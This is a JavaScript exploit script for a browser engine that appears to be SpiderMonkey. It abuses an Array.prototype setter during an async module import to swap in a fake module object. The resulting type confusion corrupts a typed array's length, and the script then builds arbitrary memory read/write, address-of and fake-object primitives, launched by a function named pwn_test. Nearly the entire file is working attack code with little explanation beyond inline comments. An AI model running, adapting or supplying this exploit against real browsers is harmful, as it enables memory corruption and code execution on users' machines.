var fake_mod = null;
var oob_arr = null;
var tmp_u8_arr = null;
var call_count = 0;
var do_capture = false;

var tenured_arr = null;
var tenured_u8 = null;
var tenured_u32 = null;

var fake_u32 = null;

function hex(val) {
    let result = "0x" + Number(val).toString(16);
    return result;
}

Object.defineProperty(BigInt.prototype, "lo", {
    get: function() {
        let lo = this & 0xFFFFFFFFn;
        return Number(lo);
    }
});
Object.defineProperty(BigInt.prototype, "hi", {
    get: function() {
        let hi = (this >> 32n) & 0xFFFFFFFFn;
        return Number(hi);
    }
});

function garbage_collect() {
    for(let i = 0; i < 3; i++) {
        new ArrayBuffer(128 * 1024 * 1024);
    }
}

function allocate_objects() {
    //backing store of tenured_arr gets allocated on
    //the Tenured heap, other objects here get allocated
    //on the Nursery heap.
    tenured_arr = new ArrayBuffer(0x1000);
    tenured_u8 = new Uint8Array(tenured_arr);
    
    let fake_script = {};

    oob_arr = []; 

    fake_mod = {
        ScriptSlot: fake_script, //self->script()
        EnvironmentSlot: 0x11111111,
        NamespaceSlot: 0x22222222,
        StatusSlot: 0, // if (status() < MODULE_STATUS_LINKED)
    };
    for(let i = 0; i < 7; i++) {
        oob_arr[i] = 0x11111111;
    }
    
    tmp_u8_arr = new Uint8Array(0x10);
    tmp_u8_arr.fill(0x66);
    
    tenured_u32 = new Uint32Array(tenured_arr);
    tenured_u32.a = 0x1337;
    

    fake_mod.AsyncSlot = false; // m->isAsync()
    fake_mod.AsyncEvaluatingPostOrderSlot = true; // m->isAsyncEvaluating()
    fake_mod.TopLevelCapabilitySlot = undefined; // if (module->hasTopLevelCapability())
    fake_mod.AsyncParentModulesSlot = undefined; // placeholder
    
    //console.log("0x" + objectAddress(fake_mod));
    //console.log("0x" + objectAddress(oob_arr));
    //console.log("0x" + objectAddress(tenured_u32));
    //console.log("0x" + objectAddress(allocate_objects));
}

function setter(original) {
    try {
        console.log("Array.prototype[0] setter called");
        Reflect.deleteProperty(Array.prototype, "0");
        this[0] = original;
        
        //The self-hosted Module.js is not explicitly visible to us
        //and .caller will be reported as null
        if(do_capture && arguments.callee.caller == null) {
            if(call_count == 0) {
                let module = original;
                console.log("replacing module with fake_mod");
                //This is really important as it allows the "import(...)" promise to be 
                //rejected properly. This tells us when the initial corruption has completed.
                // AsyncModuleExecutionRejected(cx, parent, error)
                fake_mod.AsyncParentModulesSlot = [ module ];
                
                this[0] = fake_mod;
            }
            call_count++;
        } 
        install_setter();
    } catch(e) {
        console.log(e);
    }
}

function install_setter() {
    Object.defineProperty(Array.prototype, "0", {
        set: setter,
        configurable: true,
    });
}

function make_addr(lo, hi) {
    hi = BigInt(hi);
    lo = BigInt(lo);
    let result = ((hi << 32n) | lo);
    return result;
}

function tag_obj(addr) {
    let result = (0x1FFFCn << 47n) | addr;
    return result;
}

function tag_int32(addr) {
    let result = (0x1FFF1n << 47n) | addr;
    return result;
}

function untag_addr(addr) {
    let result = addr & (1n << 47n)-1n;
    return result;
}

function install_primitives() {
    garbage_collect();
    allocate_objects();
    install_setter();
    return new Promise((resolve, reject) => {        
        do_capture = true;
        //trigger type confusion
        import("./1.mjs").then(() => {
           return reject();
        }).catch(() => {
            console.log("corruption underway");
            //overwrite length of tmp_u8_arr with a large value
            oob_arr[19] = 0xBEEF;
                        
            //check if corruption has succeeded so far.
            if(tmp_u8_arr.length == 0x10) {
                return reject();
            }
            
            console.log("tmp_u8_arr corrupted!");
            
            //copy tenured_u32 into tenured_arr's backing store
            //we will use it as a template for fake_u32
            for(let i = 0; i < 0x48; i++) {
                tenured_u8[i] = tmp_u8_arr[0x28 + i];    
            }
            
            //grab tenured_u32's backing store address 
            let backing_store_addr = make_addr(tenured_u32[12], tenured_u32[13]);

            //patch fake_u32's elements to point to the new address
            //inside the backing store
            let elements_addr = backing_store_addr + 0x40n;
            tenured_u32[2] = elements_addr.lo;
            tenured_u32[3] = elements_addr.hi;
            
            //overwrite tenured_u32's "a" property with fake_u32's address
            let tagged_addr = tag_obj(backing_store_addr);
            const prop_a_offset = 0x68;
            for(let i = 0; i < 8; i++) {
                let byte = tagged_addr & 0xFFn                
                tmp_u8_arr[prop_a_offset + i] = Number(byte);
                tagged_addr >>= 8n;
            }
            
            //get our fake_u32 object 
            fake_u32 = tenured_u32.a;
            
            //cleanup corrupted structures so GC doesn't crash
            tenured_u32.a = null;
            
            let fake_mod_addr = addr_of(fake_mod);
            let patch_addr1 = fake_mod_addr + 14n*4n;
            write_u32(patch_addr1, 0);
            write_u32(patch_addr1 + 4n, 7);
                        
            let tmp_u8_arr_addr = addr_of(tmp_u8_arr);
            let patch_addr2 = tmp_u8_arr_addr + 8n*4n;
            write_u32(patch_addr2, 0x10);
            write_u32(patch_addr2 + 4n, 0);
            
            return resolve();
        }).finally(() => {
            do_capture = false;
        });
    });
}

function fake_obj(addr) {
    let tagged_addr = tag_obj(addr);
    
    tenured_u32[16] = tagged_addr.lo;
    tenured_u32[17] = tagged_addr.hi;
            
    let result = fake_u32.a;
    
    fake_u32.a = null;
    
    return result;
}

function addr_of(obj) {
    fake_u32.a = obj;
    
    let addr = make_addr(tenured_u32[16], tenured_u32[17]);
    
    let result = untag_addr(addr);
    
    fake_u32.a = null;
    
    return result;
}

function read_u32(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    tenured_u32[12] = addr.lo;
    tenured_u32[13] = addr.hi;
    
    let result = fake_u32[0];

    return result;
}

function read_u64(addr) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    let lo = BigInt(read_u32(addr));
    let hi = BigInt(read_u32(addr + 4n));
    
    let result = (hi << 32n) | lo;
    
    return result;
}

function write_u32(addr, val) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    tenured_u32[12] = addr.lo;
    tenured_u32[13] = addr.hi;
    
    fake_u32[0] = val;
}

function write_u64(addr, value) {
    if(addr instanceof Number) {
        addr = BigInt(addr);
    }
    if(value instanceof Number) {
        value = BigInt(value);
    }
    
    write_u32(addr, value.lo);
    write_u32(addr + 4n, value.hi);
}

function pwn_test() {
    install_primitives().then(() => {
        console.log("primitives installed!");
    }).catch((err) => {
        console.log("exploit failed :(", err);
    });
}

if(this["window"] == undefined) {
    pwn_test();
}
